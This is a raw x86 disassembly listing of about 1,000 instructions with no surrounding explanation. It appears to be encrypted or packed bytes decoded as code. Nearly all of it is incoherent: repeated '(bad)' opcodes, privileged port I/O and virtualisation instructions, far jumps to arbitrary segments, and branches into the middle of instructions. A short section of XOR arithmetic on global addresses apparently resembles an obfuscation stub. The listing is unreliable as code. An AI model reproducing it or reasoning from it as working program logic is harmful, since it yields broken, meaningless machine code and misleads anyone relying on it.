  4069c2:	mov    eax,ds:0xf129cb45
  4069c7:	gs std 
  4069c9:	jmp    0x9450dff1
  4069ce:	dec    ebx
  4069cf:	pop    esi
  4069d0:	ss cwde 
  4069d2:	rcl    DWORD PTR [ebx],0x1c
  4069d5:	cmp    DWORD PTR [eax+0x25],esi
  4069d8:	inc    ebx
  4069d9:	jle    0x4069c0
  4069db:	(bad)  
  4069dc:	dec    DWORD PTR [eax+ebx*8+0x6e]
  4069e0:	pop    eax
  4069e1:	or     al,0x51
  4069e3:	mov    ebx,0x90326e6a
  4069e8:	out    0xe9,al
  4069ea:	outs   dx,DWORD PTR ds:[esi]
  4069eb:	pop    es
  4069ec:	fisttp WORD PTR [esi+ebp*4+0x38ca3eaa]
  4069f3:	sub    ch,BYTE PTR ss:[ebx+0x4d]
  4069f7:	bswap  ebx
  4069f9:	in     al,dx
  4069fa:	add    eax,0xe35ad45c
  4069ff:	vmwrite ebp,DWORD PTR [esi+0x2d]
  406a03:	or     BYTE PTR [esi],0xf9
  406a06:	sbb    BYTE PTR [edi+0x5f],cl
  406a09:	mov    ch,0xad
  406a0b:	mov    dl,dh
  406a0d:	int    0x2c
  406a0f:	(bad)  
  406a10:	out    dx,eax
  406a11:	inc    edi
  406a12:	jle    0x406a77
  406a14:	ficom  WORD PTR [esi+0x57]
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434683,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4345fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43463b,0x4346f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4345df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434637,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x33ef50eb,eax
  406a76:	fs popf 
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406a41
  406a80:	mov    bl,ah
  406a82:	aas    
  406a83:	ror    ah,cl
  406a85:	fst    st(5)
  406a87:	jg     0x406a4f
  406a89:	add    ecx,DWORD PTR [edi-0x105cb185]
  406a8f:	push   ecx
  406a90:	lods   eax,DWORD PTR ds:[esi]
  406a91:	sbb    esi,edx
  406a93:	test   DWORD PTR [edx-0x704e76f1],edi
  406a99:	and    ebx,DWORD PTR [ecx]
  406a9b:	stos   DWORD PTR es:[edi],eax
  406a9c:	iret   
  406a9d:	icebp  
  406a9e:	loop   0x406a21
  406aa0:	cli    
  406aa1:	inc    ebx
  406aa2:	jmp    0x39b0:0xd4d836d1
  406aa9:	cmp    BYTE PTR [eax+eax*2],0xb9
  406aad:	aad    0x9d
  406aaf:	mov    bl,0xf2
  406ab1:	push   esp
  406ab2:	inc    ecx
  406ab3:	daa    
  406ab4:	mov    eax,0x99b40976
  406ab9:	jns    0x406a3d
  406abb:	scas   eax,DWORD PTR es:[edi]
  406abc:	(bad)  
  406abd:	mov    dh,0x9b
  406abf:	and    al,ah
  406ac1:	cld    
  406ac2:	mov    bl,0x27
  406ac4:	outs   dx,DWORD PTR ds:[esi]
  406ac5:	adc    BYTE PTR [ebp+0x5b],ah
  406ac8:	mov    ds,WORD PTR [eax+ebp*2-0x80]
  406acc:	inc    ebp
  406acd:	and    ebp,DWORD PTR [ebx-0x67]
  406ad0:	ret    
  406ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ad2:	or     esi,0xffffffa4
  406ad5:	test   DWORD PTR [ebx],edx
  406ad7:	and    cl,bl
  406ad9:	push   ss
  406ada:	mov    ds:0x238fdde,eax
  406adf:	rcl    DWORD PTR [eax-0x57],1
  406ae2:	sub    DWORD PTR [esi+0x78],0xcf152464
  406ae9:	stos   BYTE PTR es:[edi],al
  406aea:	dec    esp
  406aeb:	rcl    ah,1
  406aed:	jecxz  0x406ae5
  406aef:	dec    edx
  406af0:	into   
  406af1:	mov    cl,0x8
  406af3:	mov    ebx,0x548cdf52
  406af8:	aas    
  406af9:	mov    eax,ds:0x7a4d15b9
  406afe:	mov    esi,DWORD PTR [eax+0x5cccb86d]
  406b04:	test   al,0x7b
  406b06:	xchg   ebp,eax
  406b07:	push   DWORD PTR [edx-0x4b]
  406b0a:	fisubr WORD PTR [eax-0x46]
  406b0d:	xchg   esi,ebp
  406b0f:	push   eax
  406b10:	int3   
  406b11:	scas   eax,DWORD PTR es:[edi]
  406b12:	retf   0xf7d9
  406b15:	fsub   st(0),st
  406b17:	sbb    BYTE PTR [ecx],al
  406b19:	ins    DWORD PTR es:[edi],dx
  406b1a:	and    BYTE PTR [edi+0x32],ch
  406b1d:	ins    BYTE PTR es:[edi],dx
  406b1e:	lea    esp,ds:0xc30e1ff4
  406b24:	into   
  406b25:	sub    eax,DWORD PTR [ecx-0x52c0c3a7]
  406b2b:	or     BYTE PTR [edi],dl
  406b2d:	addr16 aam 0x1d
  406b30:	xchg   edi,eax
  406b31:	(bad)  
  406b32:	cli    
  406b33:	add    edi,DWORD PTR [edx+0x55]
  406b36:	sbb    BYTE PTR [eax-0x771c6080],dh
  406b3c:	push   ss
  406b3d:	into   
  406b3e:	jnp    0x406b1a
  406b40:	or     edi,esp
  406b42:	imul   eax,DWORD PTR [ecx],0xed2bef3
  406b48:	lock arpl sp,bp
  406b4b:	and    ebp,eax
  406b4d:	in     al,0x4a
  406b4f:	cmp    al,0xb4
  406b51:	cs mov bh,0xbb
  406b54:	or     al,0x1
  406b56:	push   edi
  406b57:	add    BYTE PTR [esi*1-0x6ddbcf1c],al
  406b5e:	inc    edx
  406b5f:	inc    edi
  406b60:	sub    cl,bl
  406b62:	cmp    eax,0x6f42b627
  406b67:	int3   
  406b68:	mov    bl,0xc3
  406b6a:	dec    ecx
  406b6b:	mov    dh,bh
  406b6d:	and    al,0x9a
  406b6f:	icebp  
  406b70:	sub    ah,BYTE PTR [ecx+0x481a6200]
  406b76:	push   esi
  406b77:	xlat   BYTE PTR ds:[ebx]
  406b78:	mov    esi,DWORD PTR [edx+0x2d]
  406b7b:	xor    eax,0x17c080fa
  406b80:	mov    bh,0xab
  406b82:	rcl    BYTE PTR [ebp-0x7b],1
  406b85:	push   cs
  406b86:	push   ebx
  406b87:	and    eax,0x60ff97c5
  406b8c:	nop
  406b8d:	mov    WORD PTR [ebp-0x7c60dbb7],ds
  406b93:	xchg   ebp,eax
  406b94:	jns    0x406bf1
  406b96:	loope  0x406bf4
  406b98:	into   
  406b99:	dec    esp
  406b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b9b:	push   esi
  406b9c:	jnp    0x406bc5
  406b9e:	dec    eax
  406b9f:	cli    
  406ba0:	inc    ebp
  406ba1:	cmp    al,0x66
  406ba3:	jl     0x406bd3
  406ba5:	add    al,0x54
  406ba7:	jecxz  0x406b43
  406ba9:	data16 stc 
  406bab:	popf   
  406bac:	test   BYTE PTR [eax-0x1409c580],al
  406bb2:	add    eax,0x7032812c
  406bb7:	sbb    ah,ch
  406bb9:	jmp    0x9b36:0x3485977e
  406bc0:	repz inc edi
  406bc2:	add    eax,0x10acbec4
  406bc7:	xchg   esp,eax
  406bc8:	stos   DWORD PTR es:[edi],eax
  406bc9:	les    ebp,FWORD PTR [ecx-0x6e]
  406bcc:	pop    esp
  406bcd:	inc    edx
  406bce:	call   0xbaf1dc50
  406bd3:	jl     0x406ba0
  406bd5:	jo     0x406bb8
  406bd7:	arpl   dx,cx
  406bd9:	jmp    0x406b80
  406bdb:	mov    BYTE PTR [eax+ebp*1],dh
  406bde:	mov    ds:0x3cd2aa14,eax
  406be3:	mov    bl,0x91
  406be5:	outs   dx,DWORD PTR ds:[esi]
  406be6:	xchg   DWORD PTR ds:0x16760f3d,esi
  406bec:	fs xchg edi,eax
  406bee:	fld    st(7)
  406bf0:	jmp    0x6265:0x2516b5d4
  406bf7:	push   edi
  406bf8:	popa   
  406bf9:	xchg   ecx,eax
  406bfa:	push   0x20
  406bfc:	aam    0x1b
  406bfe:	inc    ebx
  406bff:	test   eax,0xb8c45895
  406c04:	cmc    
  406c05:	repz ret 0x3c20
  406c09:	push   eax
  406c0a:	pop    eax
  406c0b:	mov    cl,0xe
  406c0d:	xchg   ebx,eax
  406c0e:	push   ss
  406c0f:	mov    DWORD PTR [ecx],edi
  406c11:	mov    ds:0xd91b380b,al
  406c16:	cmp    bl,dh
  406c18:	dec    BYTE PTR [esi+ebx*8+0x160b07c8]
  406c1f:	pop    eax
  406c20:	jmp    0x406bfc
  406c22:	test   al,0x3b
  406c24:	mov    cl,0x21
  406c26:	dec    ebx
  406c27:	sahf   
  406c28:	mov    ebp,0x49d8c74e
  406c2d:	push   0x71
  406c2f:	jmp    0x406be4
  406c31:	push   edi
  406c32:	mov    ebp,DWORD PTR [eax-0x5e850054]
  406c38:	mov    dl,0x5a
  406c3a:	inc    ecx
  406c3b:	jmp    0x151158ce
  406c40:	outs   dx,DWORD PTR ds:[esi]
  406c41:	ja     0x406ca8
  406c43:	imul   esi,DWORD PTR [esi+0x72],0xffffffd5
  406c47:	mov    bl,BYTE PTR [eax-0x33]
  406c4a:	push   ds
  406c4b:	mov    ebx,0xc5f02f6
  406c50:	jbe    0x406ca0
  406c52:	sbb    al,0xcf
  406c54:	dec    ecx
  406c55:	pushf  
  406c56:	punpckhwd mm6,QWORD PTR [edx]
  406c59:	xor    BYTE PTR [edx+0x2645b6ff],dh
  406c5f:	sub    DWORD PTR [ecx-0x478cb2b1],eax
  406c65:	(bad)  
  406c66:	fistp  WORD PTR [eax-0x68e95580]
  406c6c:	aam    0x0
  406c6e:	mov    ebp,0xb4ebcb17
  406c73:	mov    WORD PTR [ebp-0x1054a2d9],?
  406c79:	test   esp,0x9f3a5a16
  406c7f:	out    0x51,al
  406c81:	push   es
  406c82:	test   ebp,0xb0405c55
  406c88:	sbb    DWORD PTR [esi],0xffffffaf
  406c8b:	fs gs jge 0x406c87
  406c8f:	dec    esp
  406c90:	or     eax,0xd4207ccb
  406c95:	jmp    0xb52266a5
  406c9a:	xchg   ebp,eax
  406c9b:	ror    dh,1
  406c9d:	cmp    esp,0x4a
  406ca0:	hlt    
  406ca1:	loop   0x406c24
  406ca3:	sub    eax,0x575ef7a1
  406ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ca9:	repz jnp 0x406c7c
  406cac:	pop    ecx
  406cad:	push   ebp
  406cae:	std    
  406caf:	adc    edi,esi
  406cb1:	mov    esi,0xcb4752f9
  406cb6:	dec    ecx
  406cb7:	int3   
  406cb8:	push   es
  406cb9:	xor    al,0x33
  406cbb:	jl     0x406ce9
  406cbd:	shrd   edi,ecx,cl
  406cc0:	jmp    0x406ce2
  406cc2:	add    al,BYTE PTR [ebx-0x1b73fa39]
  406cc8:	or     BYTE PTR [ebp-0x601807ed],ah
  406cce:	push   0x44
  406cd0:	xor    ecx,DWORD PTR ds:0xca65f6ad
  406cd6:	cmp    DWORD PTR [edi+0x2e],0xf669e9ef
  406cdd:	jge    0x406c62
  406cdf:	into   
  406ce0:	pop    ebp
  406ce1:	mov    esp,0x82b8836f
  406ce6:	jecxz  0x406c98
  406ce8:	jnp    0x406d00
  406cea:	lahf   
  406ceb:	add    bl,ch
  406ced:	cmp    al,0xb4
  406cef:	push   ecx
  406cf0:	add    DWORD PTR [ecx+0x582b99c2],ebx
  406cf6:	mov    ecx,0xb70c781d
  406cfb:	pop    esi
  406cfc:	xchg   esp,eax
  406cfd:	dec    esp
  406cfe:	sahf   
  406cff:	jns    0x406d02
  406d01:	fld    st(3)
  406d03:	daa    
  406d04:	and    BYTE PTR [eax],ah
  406d06:	inc    ebx
  406d07:	xchg   BYTE PTR [ebx-0x4fa71cde],dh
  406d0d:	rcr    BYTE PTR [esp+eiz*2-0x33],cl
  406d11:	dec    edx
  406d12:	add    al,0x9a
  406d14:	inc    esp
  406d15:	fld    QWORD PTR [eax]
  406d17:	inc    esi
  406d18:	das    
  406d19:	sbb    DWORD PTR [ecx],esp
  406d1b:	push   esi
  406d1c:	outs   dx,BYTE PTR ds:[esi]
  406d1d:	clc    
  406d1e:	and    ebp,DWORD PTR [ebp+0x72]
  406d21:	add    DWORD PTR [edx-0x78643bac],0xa352423f
  406d2b:	sbb    al,0x45
  406d2d:	int    0xe9
  406d2f:	cmc    
  406d30:	lea    ebp,[ecx]
  406d32:	imul   DWORD PTR [ecx+0x4d837ab]
  406d38:	jnp    0x406cc1
  406d3a:	add    DWORD PTR [ebx+ecx*1-0x6a8835],esi
  406d41:	xchg   esp,eax
  406d42:	aad    0xa6
  406d44:	jne    0x406ce9
  406d46:	or     DWORD PTR [ebx+0x1a],ecx
  406d49:	enter  0x1985,0x28
  406d4d:	ja     0x406dae
  406d4f:	loopne 0x406cd1
  406d51:	adc    eax,0x8dd3eca4
  406d56:	add    bl,BYTE PTR [esi]
  406d58:	or     BYTE PTR [esi-0x4f],cl
  406d5b:	popa   
  406d5c:	mov    DWORD PTR [edx-0x2e1cfc25],0x7cf687f
  406d66:	call   0x49e1:0x6b632398
  406d6d:	retf   0x10a0
  406d70:	(bad)  
  406d71:	out    0x27,al
  406d73:	mov    cs,WORD PTR [esi-0x4e65d8d]
  406d79:	test   BYTE PTR [ebx],dl
  406d7b:	xchg   edi,eax
  406d7c:	ins    BYTE PTR es:[edi],dx
  406d7d:	mov    esi,0x1c434a5b
  406d82:	(bad)  
  406d83:	jmp    0x5ac31b1b
  406d88:	jmp    FWORD PTR [ecx-0x12]
  406d8b:	dec    ebp
  406d8c:	push   edi
  406d8d:	mulps  xmm3,xmm7
  406d90:	pop    esp
  406d91:	mov    WORD PTR [ebx+0x24],?
  406d94:	cmp    al,BYTE PTR [ecx]
  406d96:	imul   ecx,DWORD PTR [esp+ecx*8+0x9],0x5d2ea8ae
  406d9e:	dec    eax
  406d9f:	icebp  
  406da0:	add    BYTE PTR [edx],ah
  406da2:	xor    DWORD PTR [ebp+0x6f3fb3a0],edi
  406da8:	test   DWORD PTR [esi+esi*4],0xb4ad3c99
  406daf:	jl     0x406db4
  406db1:	pop    edi
  406db2:	or     ebp,eax
  406db4:	shl    DWORD PTR [esi],cl
  406db6:	and    cl,BYTE PTR [ecx-0x26e455fb]
  406dbc:	and    DWORD PTR cs:[ebx],edx
  406dbf:	mov    bl,0xdb
  406dc1:	xchg   ecx,eax
  406dc2:	dec    edi
  406dc3:	add    al,0x2e
  406dc5:	mov    al,0xf9
  406dc7:	ror    BYTE PTR [edx+0xb8a36d6],0x3
  406dce:	lds    ecx,FWORD PTR [edx-0x1fc1657c]
  406dd4:	push   esp
  406dd5:	stc    
  406dd6:	mov    dh,0xa1
  406dd8:	stos   BYTE PTR es:[edi],al
  406dd9:	or     al,0xf5
  406ddb:	data16 cli 
  406ddd:	xlat   BYTE PTR ds:[ebx]
  406dde:	(bad)  
  406ddf:	jle    0x406dca
  406de1:	sbb    al,0xaf
  406de3:	push   edi
  406de4:	and    BYTE PTR [edi],ah
  406de6:	xor    edi,DWORD PTR ss:[edx]
  406de9:	stos   DWORD PTR es:[edi],eax
  406dea:	div    eax
  406dec:	xchg   esp,eax
  406ded:	push   0x11
  406def:	mov    WORD PTR [edi-0x4e],ss
  406df2:	lahf   
  406df3:	loop   0x406db2
  406df5:	jge    0x406e16
  406df7:	ror    ah,cl
  406df9:	inc    eax
  406dfa:	jl     0x406e65
  406dfc:	xchg   BYTE PTR [ebp-0xf],bh
  406dff:	sbb    bl,BYTE PTR [edx-0x6d]
  406e02:	push   ebx
  406e03:	mov    edi,0x8ab10fc5
  406e08:	sbb    eax,0x6921608e
  406e0d:	or     bl,BYTE PTR [ecx]
  406e0f:	inc    eax
  406e10:	inc    esi
  406e11:	ret    
  406e12:	sti    
  406e13:	shr    esp,1
  406e15:	std    
  406e16:	inc    ecx
  406e17:	mov    bl,al
  406e19:	or     ecx,ebp
  406e1b:	gs xor eax,0x6c1316e1
  406e21:	push   ds
  406e22:	imul   esp,DWORD PTR [edi-0x52],0x3cddf8d1
  406e29:	rcr    DWORD PTR [esi],0xf6
  406e2c:	loop   0x406e59
  406e2e:	inc    ecx
  406e2f:	mov    al,ds:0x39282a60
  406e34:	inc    BYTE PTR [ebx+0x7c]
  406e37:	dec    edi
  406e38:	add    al,0xd
  406e3a:	mov    ebp,0xcb3cc269
  406e3f:	fimul  WORD PTR [ebx+0x739170c8]
  406e45:	xchg   BYTE PTR [ebx+edx*1-0x6217cd07],dh
  406e4c:	retfw  
  406e4e:	inc    ecx
  406e4f:	repz mov edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x434647,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x4b5eaf18]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e12
  406e7b:	sbb    ch,BYTE PTR [ecx-0x35]
  406e7e:	or     bh,BYTE PTR [ecx]
  406e80:	inc    edi
  406e81:	mov    eax,0x7a3dfa52
  406e86:	in     al,dx
  406e87:	mov    ah,0xa4
  406e89:	ret    0xd422
  406e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e8d:	bnd jae 0x406e90
  406e90:	push   0x21
  406e92:	inc    esp
  406e93:	sbb    al,0xea
  406e95:	xor    ch,BYTE PTR [edi+ebp*4-0xf11bf60]
  406e9c:	inc    eax
  406e9d:	fwait
  406e9e:	mov    esi,0x9a27b554
  406ea3:	les    eax,FWORD PTR [edx+ebx*4+0x63]
  406ea7:	or     al,0x34
  406ea9:	fcom   QWORD PTR [edi+0x17e59507]
  406eaf:	fxch   st(6)
  406eb1:	mov    eax,ds:0xa31dfefa
  406eb6:	sub    edx,DWORD PTR ds:0xdad85004
  406ebc:	ror    DWORD PTR [ecx],1
  406ebe:	cmp    dh,0x69
  406ec1:	adc    BYTE PTR [ecx],ch
  406ec3:	fcomp  QWORD PTR [edx]
  406ec5:	sbb    al,0xd3
  406ec7:	sar    BYTE PTR [edx],0xdc
  406eca:	stos   BYTE PTR es:[edi],al
  406ecb:	push   cs
  406ecc:	addr16 std 
  406ece:	(bad)  
  406ed0:	and    ebx,DWORD PTR [ebp-0x3c84ea3b]
  406ed6:	mov    ds:0xcfbf524b,eax
  406edb:	in     eax,dx
  406edc:	pop    eax
  406edd:	lods   eax,DWORD PTR ds:[esi]
  406ede:	sbb    bl,BYTE PTR [ecx]
  406ee0:	sbb    al,0xc6
  406ee2:	sub    DWORD PTR [ebx],eax
  406ee4:	or     DWORD PTR [eax+0x73],edi
  406ee7:	(bad)
  406eea:	(bad)  
  406eeb:	out    dx,al
  406eec:	mov    cl,0x87
  406eee:	(bad)  [ecx+0x3b]
  406ef1:	xchg   ebx,eax
  406ef2:	cmp    al,0x7c
  406ef4:	sub    esp,eax
  406ef6:	or     eax,0x8d281b07
  406efb:	mov    ch,0x87
  406efd:	rcl    BYTE PTR ds:0x31ad0f0,0x66
  406f04:	adc    eax,0x9eb5b625
  406f09:	retf   
  406f0a:	(bad)  
  406f0b:	(bad)  
  406f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f0d:	or     ecx,edx
  406f0f:	sbb    al,0x81
  406f11:	(bad)
  406f14:	sysexit 
  406f16:	sar    DWORD PTR [edi],cl
  406f18:	std    
  406f19:	addr16 popa 
  406f1b:	iret   
  406f1c:	jmp    0x406f75
  406f1e:	and    DWORD PTR [edx+ebx*2],esp
  406f21:	pop    esp
  406f22:	lock sub DWORD PTR [ecx-0x9e1c096],esi
  406f29:	aas    
  406f2a:	mov    esi,0xb49e3ee5
  406f2f:	out    0xdb,eax
  406f31:	push   es
  406f32:	dec    edx
  406f33:	bound  esp,QWORD PTR [esi]
  406f35:	shr    ch,0xcd
  406f38:	push   cs
  406f39:	jb     0x406eea
  406f3b:	cdq    
  406f3c:	jmp    0x406f4d
  406f3e:	js     0x406edd
  406f40:	adc    DWORD PTR [edi-0x449e2dba],0x49
  406f47:	lock adc BYTE PTR [edi+0x7f5c8f97],ah
  406f4e:	push   esi
  406f4f:	cld    
  406f50:	scas   al,BYTE PTR es:[edi]
  406f51:	push   0x2a7fd20a
  406f56:	adc    BYTE PTR [ebx-0x7a6a4880],0x76
  406f5d:	sub    eax,0x1bfcb9e8
  406f62:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406f64:	dec    esi
  406f65:	arpl   WORD PTR [eax],ax
  406f67:	jl     0x406fdd
  406f69:	sub    al,0x0
  406f6b:	or     eax,0xc9d61145
  406f70:	fstp   QWORD PTR [eax+0x68b7bd83]
  406f76:	mov    esp,DWORD PTR [esi-0x3ce66159]
  406f7c:	pop    eax
  406f7d:	sub    al,0xe1
  406f7f:	mov    ch,0x88
  406f81:	in     eax,0x1f
  406f83:	mov    ah,0x58
  406f85:	mov    ss,WORD PTR [ebx]
  406f87:	ret    0xef10
  406f8a:	imul   ebp
  406f8c:	dec    esi
  406f8d:	push   esp
  406f8e:	ins    BYTE PTR es:[edi],dx
  406f8f:	cmp    eax,0x149378bf
  406f94:	sbb    BYTE PTR [edx+0x67],0x2e
  406f98:	sbb    al,0xbc
  406f9a:	and    al,0x7c
  406f9c:	xlat   BYTE PTR ds:[ebx]
  406f9d:	outs   dx,BYTE PTR ds:[esi]
  406f9e:	(bad)  
  406f9f:	setbe  BYTE PTR ds:0xf0f07c77
  406fa6:	in     al,dx
  406fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa8:	imul   esi
  406faa:	jns    0x406f4a
  406fac:	add    DWORD PTR [esp+eiz*8-0x5539f7c],esi
  406fb3:	in     al,dx
  406fb4:	test   al,0x24
  406fb6:	add    eax,0x1db50315
  406fbb:	sub    ebx,edi
  406fbd:	aam    0xc6
  406fbf:	(bad)  
  406fc0:	mov    al,0x13
  406fc2:	pop    ebx
  406fc3:	sub    ah,cl
  406fc5:	pop    es
  406fc6:	push   ds
  406fc7:	int    0xec
  406fc9:	rcl    DWORD PTR [edi+0x45],0x36
  406fcd:	or     DWORD PTR [edi+ecx*4-0x50],ebx
  406fd1:	fwait
  406fd2:	mov    eax,0x98511b9
  406fd7:	or     ebp,ecx
  406fd9:	xchg   esp,eax
  406fda:	sbb    ebx,DWORD PTR [ebp+0x10]
  406fdd:	xchg   ebp,eax
  406fde:	mov    ebp,0xd5c44af5
  406fe3:	xchg   BYTE PTR [ecx],ah
  406fe5:	scas   al,BYTE PTR es:[edi]
  406fe6:	(bad)  
  406fe7:	ja     0x407042
  406fe9:	xlat   BYTE PTR ds:[ebx]
  406fea:	(bad)
  406fed:	daa    
  406fee:	ret    
  406fef:	dec    ecx
  406ff0:	adc    eax,0xe88d2230
  406ff5:	jb     0x407074
  406ff7:	popf   
  406ff8:	out    0x5e,eax
  406ffa:	ret    0x710e
  406ffd:	jns    0x406f97
  406fff:	and    esp,DWORD PTR [esi-0x68]
  407002:	int    0x29
  407004:	(bad)  
  407005:	fdiv   QWORD PTR [ebx-0x330970a2]
  40700b:	and    cl,BYTE PTR [ecx-0x80]
  40700e:	jl     0x40702e
  407010:	loope  0x407074
  407012:	mov    edi,0x502d3cbc
  407017:	into   
  407018:	inc    esp
  407019:	adc    cl,dl
  40701b:	or     sp,WORD PTR [eax-0x1b]
  40701f:	fwait
  407020:	ss cmp al,0xbf
  407023:	fcom   QWORD PTR [ecx]
  407025:	js     0x406fc5
  407027:	jnp    0x406fe8
  407029:	and    eax,0xe3886063
  40702e:	retf   
  40702f:	repnz mov eax,ds:0x556e3c1
  407035:	bound  edx,QWORD PTR [ecx+0x1a]
  407038:	and    ebx,DWORD PTR [ebp+0x69]
  40703b:	jle    0x40709c
  40703d:	xchg   ebx,eax
  40703e:	dec    edi
  40703f:	inc    edi
  407040:	ja     0x40703b
  407042:	xchg   ebp,eax
  407043:	mov    al,0x84
  407045:	js     0x406fff
  407047:	aad    0x28
  407049:	push   ecx
  40704a:	lahf   
  40704b:	out    dx,eax
  40704c:	fdiv   DWORD PTR ss:[esi]
  40704f:	add    BYTE PTR [edx],bh
  407051:	sahf   
  407052:	stos   BYTE PTR es:[edi],al
  407053:	scas   eax,DWORD PTR es:[edi]
  407054:	fdivr  QWORD PTR [edx]
  407056:	adc    dl,bh
  407058:	shl    DWORD PTR ss:[edi+eax*8],0x9d
  40705d:	mov    edx,DWORD PTR [ebx+0x7c]
  407060:	icebp  
  407061:	loope  0x40701a
  407063:	dec    ebp
  407064:	xor    eax,0x934163ce
  407069:	pop    ebp
  40706a:	jle    0x407027
  40706c:	mov    ds:0x6be5d807,al
  407071:	mov    edi,DWORD PTR [ebx]
  407073:	in     eax,dx
  407074:	push   ss
  407075:	xchg   DWORD PTR [ebx+0x64aa45c5],edx
  40707b:	imul   edx,DWORD PTR ds:0xbaa42321,0xffffff92
  407082:	cmp    DWORD PTR [edi],edi
  407084:	(bad)  
  407085:	cvtps2pd xmm2,QWORD PTR [edx+0x32]
  407089:	nop
  40708a:	xchg   esi,eax
  40708b:	aad    0x69
  40708d:	pop    edx
  40708e:	add    BYTE PTR [eax-0x2f],dl
  407091:	cld    
  407092:	dec    esi
  407093:	iret   
  407094:	lahf   
  407095:	or     esp,edx
  407097:	cmp    eax,0xc3f5455e
  40709c:	hlt    
  40709d:	jp     0x407060
  40709f:	and    eax,0x30adf955
  4070a4:	sbb    eax,0x22550951
  4070a9:	cmc    
  4070aa:	loope  0x4070e0
  4070ac:	jge    0x4070c4
  4070ae:	lods   eax,DWORD PTR ds:[esi]
  4070af:	jb     0x407031
  4070b1:	icebp  
  4070b2:	call   0x4289:0xf29b9dbe
  4070b9:	and    dh,bh
  4070bb:	outs   dx,BYTE PTR ds:[esi]
  4070bc:	and    eax,0xa6427f4e
  4070c1:	ja     0x4070e9
  4070c3:	call   0xf2c4cb67
  4070c8:	inc    edi
  4070c9:	push   ss
  4070ca:	xor    ebp,DWORD PTR es:[ebx+edx*4-0x6d]
  4070cf:	cdq    
  4070d0:	retf   0x3d7
  4070d3:	sbb    eax,0x9e717983
  4070d8:	jg     0x40705b
  4070da:	cmp    eax,0xc7de7db7
  4070df:	in     eax,dx
  4070e0:	fsubr  st(0),st
  4070e2:	push   esi
  4070e3:	dec    ebp
  4070e4:	pusha  
  4070e5:	add    eax,DWORD PTR [ebx]
  4070e7:	ins    BYTE PTR es:[edi],dx
  4070e8:	add    eax,0xd3e146b3
  4070ed:	dec    esp
  4070ee:	(bad)  
  4070ef:	mov    eax,ds:0x660f544
  4070f4:	mov    ch,0x4b
  4070f6:	jbe    0x407091
  4070f8:	pushf  
  4070f9:	jo     0x40708a
  4070fb:	pop    edx
  4070fc:	cdq    
  4070fd:	pop    ebx
  4070fe:	xor    DWORD PTR [edi+ebp*1],ebx
  407101:	adc    DWORD PTR [edx+edi*1+0x38576e67],ecx
  407108:	add    DWORD PTR ds:0xfe1bc59c,ebx
  40710e:	adc    DWORD PTR [esi+0x1a],ecx
  407111:	xor    DWORD PTR [eax-0x6bd8ac8d],0x67
  407118:	push   ecx
  407119:	mov    ds:0xd75a08be,eax
  40711e:	cdq    
  40711f:	fsub   QWORD PTR [ecx-0x7a]
  407122:	test   BYTE PTR [ebp-0x3ddb8d12],ch
  407128:	or     esp,ebp
  40712a:	mov    DWORD PTR [eax],ecx
  40712c:	adc    ch,BYTE PTR [ebp+0x3b415b4a]
  407132:	jecxz  0x4070d0
  407134:	sub    ah,cl
  407136:	mov    ch,0x11
  407138:	inc    esi
  407139:	into   
  40713a:	or     DWORD PTR [edx+0xe],esp
  40713d:	mov    esp,DWORD PTR [ecx]
  40713f:	sahf   
  407140:	out    dx,eax
  407141:	dec    edi
  407142:	repnz push es
  407144:	addr16 jae 0x4070e0
  407147:	fld    QWORD PTR [esi-0x7c16e10b]
  40714d:	scas   al,BYTE PTR es:[edi]
  40714e:	or     DWORD PTR [ecx-0x78af950d],edi
  407154:	cmp    esp,DWORD PTR [eax]
  407156:	neg    BYTE PTR [ecx+0x23]
  407159:	jg     0x40718e
  40715b:	add    DWORD PTR [eax-0x5eb5e2a1],esp
  407161:	push   cs
  407162:	push   ss
  407163:	and    al,dh
  407165:	adc    DWORD PTR [esi],edx
  407167:	sti    
  407168:	sub    DWORD PTR [ebx-0x5411ef5f],edi
  40716e:	mov    ch,0xed
  407170:	or     BYTE PTR [ecx],al
  407172:	mov    bh,0x64
  407174:	popa   
  407175:	pop    esi
  407176:	jecxz  0x407196
  407178:	jbe    0x407133
  40717a:	fst    DWORD PTR [esi]
  40717c:	dec    eax
  40717d:	push   0x69
  40717f:	fadd   QWORD PTR [ebx-0x37d16d92]
  407185:	mov    ecx,0xb7fdf9e2
  40718a:	and    al,0x85
  40718c:	fwait
  40718d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40718e:	sbb    BYTE PTR [edi],al
  407190:	lds    ebx,FWORD PTR [eax+0x7eff940a]
  407196:	mov    eax,ds:0x4925d30f
